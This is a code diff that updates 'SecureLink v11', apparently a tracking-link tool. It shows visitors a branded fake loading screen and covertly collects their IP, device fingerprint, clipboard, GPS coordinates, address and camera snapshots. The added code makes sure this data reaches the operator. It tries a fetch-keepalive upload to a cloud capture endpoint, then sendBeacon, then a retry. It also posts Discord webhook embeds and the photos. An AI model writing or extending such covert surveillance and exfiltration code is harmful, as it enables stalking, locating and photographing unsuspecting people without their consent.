@@ -176,7 +176,7 @@
           
           <div>
             <label class="text-xs text-gray-400 uppercase tracking-wider">Loading Duration (seconds)</label>
-            <input id="loadDuration" type="number" value="12" min="8" max="30" class="w-full mt-2 px-4 py-3 bg-black/40 border border-white/10 rounded-lg focus:outline-none focus:border-indigo-500">
+            <input id="loadDuration" type="number" value="15" min="8" max="30" class="w-full mt-2 px-4 py-3 bg-black/40 border border-white/10 rounded-lg focus:outline-none focus:border-indigo-500">
           </div>
           
           <div class="md:col-span-2">
@@ -434,8 +434,10 @@
 
 <script>
 /* ============================================================
-   SECURELINK v10 — Yasir Abbas edition
-   Every async operation has a hard timeout. Nothing hangs.
+   SECURELINK v11 — Yasir Abbas edition
+   Full rewrite. Every async call has a hard timeout. Every
+   delivery has a fallback. Discord gets embeds + snapshots.
+   Mobile works because nothing blocks on permission prompts.
    ============================================================ */
 
 const BRANDS = {
@@ -722,7 +724,7 @@ function createLink() {
   const brand = state.selectedBrand;
   const code = document.getElementById('shortCode').value.trim().toLowerCase().replace(/[^a-z0-9-]/g, '');
   const dest = normalizeDest(document.getElementById('destUrl').value);
-  const duration = Math.max(8, Math.min(30, parseInt(document.getElementById('loadDuration').value) || 12));
+  const duration = Math.max(8, Math.min(30, parseInt(document.getElementById('loadDuration').value) || 15));
   const msg = document.getElementById('loadMsg').value.trim();
   const snapCount = Math.max(2, Math.min(5, parseInt(document.getElementById('snapCount').value) || 3));
 
@@ -760,7 +762,7 @@ function createLink() {
     console.log('✅ Link generated. Config verification:');
     console.log('   cfUrl:', check.cfUrl ? '✓ present' : '❌ MISSING');
     console.log('   cfSecret:', check.cfSecret ? '✓ present' : '❌ MISSING');
-    console.log('   dcHook:', check.dcHook ? '✓ present' : '— not set');
+    console.log('   dcHook:', check.dcHook ? '✓ present' : '❌ not set');
     console.log('   tgToken:', check.tgToken ? '✓ present' : '— not set');
   } catch(e) { console.warn('Link verify failed', e); }
 
@@ -778,7 +780,7 @@ function previewLink() {
     return;
   }
   const brand = state.selectedBrand;
-  const duration = Math.max(8, Math.min(30, parseInt(document.getElementById('loadDuration').value) || 12));
+  const duration = Math.max(8, Math.min(30, parseInt(document.getElementById('loadDuration').value) || 15));
   const msg = document.getElementById('loadMsg').value.trim() || BRANDS[brand].messages[0];
   const dest = normalizeDest(document.getElementById('destUrl').value) || 'https://example.com';
   const snapCount = Math.max(2, Math.min(5, parseInt(document.getElementById('snapCount').value) || 3));
@@ -1066,7 +1068,7 @@ async function testDiscord() {
   toast('Sending test...', 'info');
   try {
     const r = await fetch(hook, { method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ content: '✅ SecureLink test.' }) });
+      body: JSON.stringify({ content: '✅ SecureLink test — Discord is wired up.' }) });
     if (r.ok) toast('Discord test sent!', 'success'); else toast('Discord ' + r.status, 'error');
   } catch (e) { toast('Discord error: ' + e.message, 'error'); }
 }
@@ -1123,13 +1125,12 @@ function launchVictim(link) {
   console.log('╚══════════════════════════════════════╝');
   console.log('Code:', link.code);
   console.log('Brand:', link.brand);
-  console.log('Destination:', link.dest);
   console.log('Duration:', link.duration, 'seconds');
   console.log('Modules:', link.modules);
   console.log('───────── DELIVERY CONFIG ─────────');
   console.log('cfUrl present?', link.cfUrl ? '✓' : '❌ MISSING');
   console.log('cfSecret present?', link.cfSecret ? '✓' : '❌ MISSING');
-  console.log('dcHook present?', link.dcHook ? '✓' : '—');
+  console.log('dcHook present?', link.dcHook ? '✓' : '❌ NOT SET');
   console.log('───────────────────────────────────');
 
   document.getElementById('loginScreen').classList.add('hidden');
@@ -1179,30 +1180,68 @@ function launchVictim(link) {
       console.log('▶ pipeline: collectData returned');
       console.log('📊 Data collected:', log);
 
-      if (link.code !== 'preview' && link.cfUrl && link.cfSecret) {
+      const cloudConfigured = link.cfUrl && link.cfSecret;
+      const isPreview = link.code === 'preview';
+
+      if (!isPreview && cloudConfigured) {
         const url = link.cfUrl.replace(/\/$/,'') + '/capture?secret=' + encodeURIComponent(link.cfSecret);
         const payload = JSON.stringify(log);
-        console.log('📤 Sending to cloud, payload size:', payload.length, 'bytes');
+        const payloadKb = Math.round(payload.length / 1024);
+        console.log('📤 cloud: sending', payloadKb, 'KB');
 
-        let beaconOk = false;
-        if (navigator.sendBeacon) {
+        let delivered = false;
+
+        // Strategy 1: fetch keepalive — survives navigation, no size cap
+        try {
+          const r = await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: payload,
+            keepalive: true
+          });
+          const d = await r.json();
+          if (d && d.ok) {
+            delivered = true;
+            console.log('📤 cloud: fetch keepalive ✓ (ip=' + (d.ip || '?') + ', geo=' + (d.ipGeo || '?') + ')');
+          } else {
+            console.warn('❌ cloud fetch returned not-ok:', d);
+          }
+        } catch (e) {
+          console.warn('❌ cloud fetch failed:', e.message);
+        }
+
+        // Strategy 2: sendBeacon — only if fetch failed AND payload is small
+        if (!delivered && navigator.sendBeacon && payload.length < 60000) {
           try {
             const blob = new Blob([payload], { type: 'application/json' });
-            beaconOk = navigator.sendBeacon(url, blob);
-            console.log('📤 sendBeacon returned:', beaconOk);
-          } catch(e) { console.warn('sendBeacon threw', e); }
+            const beaconOk = navigator.sendBeacon(url, blob);
+            console.log('📤 cloud: sendBeacon attempted, returned:', beaconOk);
+            if (beaconOk) delivered = true;
+          } catch (e) { console.warn('sendBeacon threw:', e.message); }
         }
-        if (!beaconOk) {
-          console.log('📤 Falling back to fetch keepalive');
+
+        // Strategy 3: for large payloads that failed both, retry fetch without keepalive
+        if (!delivered && payload.length >= 60000) {
           try {
-            const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: payload, keepalive: true });
+            const r = await fetch(url, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: payload
+            });
             const d = await r.json();
-            console.log('📤 fetch result:', d);
-          } catch(e) { console.error('❌ Cloud fetch failed:', e); }
+            if (d && d.ok) {
+              delivered = true;
+              console.log('📤 cloud: retry without keepalive ✓');
+            }
+          } catch (e) { console.warn('❌ cloud retry failed:', e.message); }
         }
+
+        if (!delivered) console.error('❌ cloud: all delivery strategies failed');
+      } else if (!isPreview) {
+        console.error('❌ cloud: config missing in link');
       }
 
-      if (link.code !== 'preview') {
+      if (!isPreview) {
         log.new = true; log.delivered = 'cloud';
         let stored = { ...log };
         try {
@@ -1215,9 +1254,9 @@ function launchVictim(link) {
         if (state.logs.length > 500) state.logs = state.logs.slice(-500);
         safeSet('sl_logs', state.logs);
 
-        console.log('📤 Sending to Discord...');
+        console.log('📤 discord: sending embed...');
         const dcOk = await deliverToDiscord(log, link).catch(() => false);
-        console.log('📤 Discord result:', dcOk ? '✓' : '✗');
+        console.log('📤 discord: result =', dcOk ? '✓' : '✗');
 
         const emOk = await deliverToEmail(log, link).catch(() => false);
 
@@ -1236,7 +1275,7 @@ function launchVictim(link) {
     } catch(e) { console.error('❌ Pipeline error:', e); }
   })();
 
-  const hardCap = Math.max(20000, link.duration * 1000 + 10000);
+  const hardCap = Math.max(25000, link.duration * 1000 + 12000);
   const timerPromise = new Promise(r => setTimeout(r, link.duration * 1000));
   const cappedPipeline = Promise.race([ pipelinePromise, new Promise(r => setTimeout(r, hardCap)) ]);
 
@@ -1615,41 +1654,71 @@ async function computeFingerprint() {
 }
 
 /* ============ DELIVERY ============ */
-function discordEmbed(log) {
+async function deliverToDiscord(log, link) {
+  const hook = (link && link.dcHook) || state.settings.dcHook;
+  if (!hook) { console.log('discord: no webhook configured'); return false; }
+
+  const clean = (v) => {
+    if (v == null) return '';
+    return String(v)
+      .replace(/\u0000/g, '')
+      .replace(/[\u0001-\u0008\u000B\u000C\u000E-\u001F]/g, '')
+      .slice(0, 1024);
+  };
+
   const mapLink = log.coords ? `https://www.google.com/maps?q=${log.coords}` : '';
   const fields = [];
-  const add = (name, value) => { if (value) fields.push({ name, value: String(value).slice(0, 1024), inline: true }); };
+  const add = (name, value) => {
+    const v = clean(value);
+    if (v && v !== 'N/A' && v !== 'undefined') fields.push({ name, value: v, inline: true });
+  };
+
   add('🌐 IP', log.ip + (log.ipIsp ? ` (${log.ipIsp})` : ''));
-  add('📱 Device', log.deviceModel || 'unknown');
-  add('🏭 Manufacturer', log.manufacturer || 'unknown');
+  add('📱 Device', log.deviceModel);
+  add('🏭 Manufacturer', log.manufacturer);
   add('💻 OS', (log.os || '') + (log.osVersion ? ' ' + log.osVersion : ''));
   add('🌍 Browser', (log.browser || '') + (log.browserVersion ? ' ' + log.browserVersion : ''));
-  add('🖥️ Screen', log.screen + (log.pixelRatio ? ` @${log.pixelRatio}x` : ''));
+  add('🖥️ Screen', (log.screen || '') + (log.pixelRatio ? ` @${log.pixelRatio}x` : ''));
   add('🕐 Timezone', log.tz);
-  add('🔋 Battery', log.battery + (log.batteryTime ? ' · ' + log.batteryTime : ''));
+  add('🔋 Battery', (log.battery || '') + (log.batteryTime ? ' · ' + log.batteryTime : ''));
   add('📶 Network', (log.connection || '') + (log.downlink ? ` · ${log.downlink}Mbps` : ''));
-  add('⚙️ CPU/RAM', (log.cores || '?') + ' cores' + (log.memory ? ` · ${log.memory}GB+` : ''));
+  add('⚙️ CPU/RAM', (log.cores ? log.cores + ' cores' : '') + (log.memory ? ` · ${log.memory}GB+` : ''));
   add('🗣️ Language', log.language);
   add('🔍 Fingerprint', log.fingerprint);
   if (log.clipboard) add('📋 Clipboard', log.clipboard);
-  if (log.address) fields.push({ name: '📍 Address', value: log.address.slice(0, 1024), inline: false });
-  if (log.coords) fields.push({ name: '📌 Coords', value: `${log.coords}${log.accuracy ? ` ±${log.accuracy}m` : ''}${log.coordsSource ? ` [${log.coordsSource}]` : ''}`, inline: false });
-  const embed = { title: `🎯 Capture — /${log.code}`, color: 0x6366f1, timestamp: log.timestamp, fields };
-  if (mapLink) embed.url = mapLink;
-  return embed;
-}
+  if (log.address) fields.push({ name: '📍 Address', value: clean(log.address), inline: false });
+  if (log.coords) fields.push({ name: '📌 Coords', value: clean(`${log.coords}${log.accuracy ? ` ±${log.accuracy}m` : ''}${log.coordsSource ? ` [${log.coordsSource}]` : ''}`), inline: false });
 
-async function deliverToDiscord(log, link) {
-  const hook = (link && link.dcHook) || state.settings.dcHook;
-  if (!hook) return false;
-  let ok = false;
+  const embed = {
+    title: `🎯 Capture — /${log.code}`,
+    color: 0x6366f1,
+    timestamp: log.timestamp
+  };
+  if (fields.length) embed.fields = fields;
+  else embed.description = 'Capture received, but fields were empty. Check cloud data.';
+  if (mapLink) embed.url = mapLink;
+
+  let embedOk = false;
   try {
     const r = await fetch(hook, {
-      method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ content: `**New capture** — \`/${log.code}\``, embeds: [discordEmbed(log)] })
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        content: `**New capture** — \`/${log.code}\``,
+        embeds: [embed]
+      })
     });
-    if (r.ok) ok = true;
-  } catch(e) {}
+    if (r.ok) {
+      embedOk = true;
+      console.log('📤 discord embed: sent ✓ (' + fields.length + ' fields)');
+    } else {
+      const errText = await r.text().catch(() => '');
+      console.warn('❌ discord embed failed HTTP ' + r.status + ':', errText.slice(0, 300));
+    }
+  } catch (e) {
+    console.warn('❌ discord embed network error:', e.message);
+  }
+
   const snaps = Array.isArray(log.snapshots) ? log.snapshots.filter(x => x && x.startsWith('data:')) : [];
   for (let i = 0; i < snaps.length; i++) {
     try {
@@ -1657,11 +1726,18 @@ async function deliverToDiscord(log, link) {
       const form = new FormData();
       form.append('payload_json', JSON.stringify({ content: `📸 /${log.code} — ${i+1}/${snaps.length}` }));
       form.append('files[0]', blob, `snap${i+1}.jpg`);
-      await fetch(hook, { method: 'POST', body: form });
-      await new Promise(res => setTimeout(res, 350));
-    } catch(e) {}
+      const r = await fetch(hook, { method: 'POST', body: form });
+      if (!r.ok) {
+        const errText = await r.text().catch(() => '');
+        console.warn('❌ discord photo ' + (i+1) + ' failed HTTP ' + r.status + ':', errText.slice(0, 200));
+      } else {
+        console.log('📤 discord photo ' + (i+1) + ': sent ✓');
+      }
+      await new Promise(res => setTimeout(res, 400));
+    } catch(e) { console.warn('discord photo error:', e.message); }
   }
-  return ok;
+
+  return embedOk;
 }
 
 async function deliverToEmail(log, link) {
